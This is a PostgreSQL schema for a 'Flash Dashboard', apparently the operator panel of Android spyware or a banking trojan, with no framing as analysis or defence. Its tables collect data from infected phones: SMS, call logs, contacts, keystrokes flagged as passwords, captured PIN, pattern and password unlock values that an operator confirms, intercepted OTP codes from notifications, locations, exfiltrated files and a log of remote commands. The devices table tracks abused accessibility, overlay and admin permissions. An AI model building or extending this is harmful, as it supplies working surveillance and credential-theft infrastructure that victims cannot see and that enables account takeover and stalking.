-- Flash Dashboard PostgreSQL Schema v2.0
-- Run once: psql -U postgres -d flash -f schema.sql

CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- ─── Devices ──────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS devices (
    id              UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    device_id       TEXT UNIQUE NOT NULL,          -- hardware fingerprint from APK
    alias           TEXT,                          -- operator-assigned name
    model           TEXT,
    brand           TEXT,
    android_version TEXT,
    sdk_int         INTEGER,
    battery         INTEGER,
    is_charging     BOOLEAN DEFAULT FALSE,
    has_accessibility BOOLEAN DEFAULT FALSE,
    has_overlay     BOOLEAN DEFAULT FALSE,
    has_admin       BOOLEAN DEFAULT FALSE,
    screen_width    INTEGER,
    screen_height   INTEGER,
    carrier         TEXT,
    phone_number    TEXT,
    imei            TEXT,
    country         TEXT,
    ip_address      TEXT,
    last_seen       TIMESTAMPTZ DEFAULT NOW(),
    first_seen      TIMESTAMPTZ DEFAULT NOW(),
    online          BOOLEAN DEFAULT FALSE,
    tags            TEXT[] DEFAULT '{}',
    notes           TEXT DEFAULT ''
);

-- ─── SMS ──────────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS sms (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    sms_id          TEXT,
    address         TEXT,                          -- phone number
    body            TEXT,
    sms_date        BIGINT,
    sms_type        INTEGER,                       -- 1=inbox 2=sent
    is_read         BOOLEAN DEFAULT FALSE,
    received_at     TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE(device_id, sms_id)
);

-- ─── Call Log ─────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS calls (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    call_id         TEXT,
    number          TEXT,
    name            TEXT,
    duration        INTEGER,                       -- seconds
    call_date       BIGINT,
    call_type       INTEGER,                       -- 1=incoming 2=outgoing 3=missed
    received_at     TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE(device_id, call_id)
);

-- ─── Contacts ─────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS contacts (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    contact_id      TEXT,
    name            TEXT,
    phone           TEXT,
    email           TEXT,
    received_at     TIMESTAMPTZ DEFAULT NOW(),
    UNIQUE(device_id, contact_id)
);

-- ─── Keylog ───────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS keylog (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    app_name        TEXT,
    pkg             TEXT,
    text            TEXT,
    is_password     BOOLEAN DEFAULT FALSE,
    event_type      TEXT,
    ts              BIGINT,
    received_at     TIMESTAMPTZ DEFAULT NOW()
);

-- ─── Passwords / Unlock Credentials ──────────────────────────────────────────
CREATE TABLE IF NOT EXISTS passwords (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    method          TEXT,                          -- pin | pattern | password | fingerprint
    value           TEXT,                          -- the actual pin/pass/pattern sequence
    app_context     TEXT,                          -- app where captured (if applicable)
    confidence      INTEGER DEFAULT 100,           -- 0-100
    confirmed       BOOLEAN DEFAULT FALSE,         -- operator verified it works
    captured_at     TIMESTAMPTZ DEFAULT NOW()
);

-- ─── Notifications ────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS notifications (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    pkg             TEXT,
    title           TEXT,
    body            TEXT,
    is_otp          BOOLEAN DEFAULT FALSE,
    otp_code        TEXT,
    post_time       BIGINT,
    received_at     TIMESTAMPTZ DEFAULT NOW()
);

-- ─── Location ─────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS locations (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    lat             DOUBLE PRECISION,
    lng             DOUBLE PRECISION,
    accuracy        FLOAT,
    altitude        DOUBLE PRECISION,
    speed           FLOAT,
    provider        TEXT,
    address         TEXT,
    received_at     TIMESTAMPTZ DEFAULT NOW()
);

-- ─── Files ────────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS files (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    path            TEXT,
    name            TEXT,
    size            BIGINT,
    mime_type       TEXT,
    data            BYTEA,
    received_at     TIMESTAMPTZ DEFAULT NOW()
);

-- ─── Accounts ─────────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS accounts (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
    account_name    TEXT,
    account_type    TEXT,
    received_at     TIMESTAMPTZ DEFAULT NOW()
);

-- ─── Command Log ─────────────────────────────────────────────────────────────
CREATE TABLE IF NOT EXISTS command_log (
    id              BIGSERIAL PRIMARY KEY,
    device_id       TEXT NOT NULL,
    command         TEXT,
    payload         JSONB,
    sent_at         TIMESTAMPTZ DEFAULT NOW(),
    ack             BOOLEAN DEFAULT FALSE
);

-- ─── Indexes ─────────────────────────────────────────────────────────────────
CREATE INDEX IF NOT EXISTS idx_sms_device     ON sms(device_id, sms_date DESC);
CREATE INDEX IF NOT EXISTS idx_calls_device   ON calls(device_id, call_date DESC);
CREATE INDEX IF NOT EXISTS idx_keylog_device  ON keylog(device_id, received_at DESC);
CREATE INDEX IF NOT EXISTS idx_notif_device   ON notifications(device_id, received_at DESC);
CREATE INDEX IF NOT EXISTS idx_loc_device     ON locations(device_id, received_at DESC);
CREATE INDEX IF NOT EXISTS idx_pass_device    ON passwords(device_id, captured_at DESC);
CREATE INDEX IF NOT EXISTS idx_devices_online ON devices(online, last_seen DESC);
